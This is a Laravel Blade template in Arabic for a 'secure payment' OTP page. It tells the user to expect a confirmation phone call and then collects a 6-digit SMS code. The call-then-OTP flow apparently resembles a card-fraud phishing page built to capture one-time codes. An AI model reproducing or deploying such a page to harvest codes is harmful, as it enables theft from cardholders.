@extends('layouts.main')
@section('content')
<section class="padding-start container mb-5">
  <div class="row justify-content-center shadow">
    <div class="col-12 col-lg-7">
      <div class="row">
        <div class="col-12 mt-5 mb-4">
          <div class="card">
            <div class="card-header">
                الدفع اًمن 100%
            </div>
          </div>
          <div class="card-body">

            <form method="post" action="{{route('otp.store')}}">
                @csrf
                <div class="col-12 mt-3">
                    <h3 style="color: black"> <img style="width: 70px" src="{{asset('theme/assets/frontend/images/msg.gif')}}" alt=""> التحقق من عملية الدفع</h3>
                    <p style="color: black">سيتم الاتصال بك خلال لحظات لتأكيد عملية السداد يرجى الموافقه على الاتصال واتباع الخطوات المطلوبه حتى يتم إرسال رمز التحقق Otp ☑</p>
                    <p style="color: black">الرجاء ادخال رمز التحقق المكون من 6 خانات الذي تم إرساله برسالة نصية الى هاتفك</p>
                    <hr>
                </div>
                <div class="col-12">
                  <div class="mb-3">
                    <label for="code" class="form-label">رمز التحقق</label>
                    <input autocomplete="off" onkeypress="return onlyNumberKey(event)" maxlength="6" type="tel" value="" class="form-control form-control-lg " id="code" name="code" placeholder="أدخل رمز التحقق المكون من 6 خانات" required>
                    @error('code')
                    <div class="alert alert-danger">{{ $message }}</div>
                    @enderror
                  </div>
                </div>

              </div>
              <div class="col-12 mt-5">
                <button style="width: 100%;" type="submit" class="btn btn-primary btn-lg form-control-lg">التالـــي</button>
              </div>

            </form>

          </div>
        </div>
      </div>
    </div>
  </div>
</section>

@endsection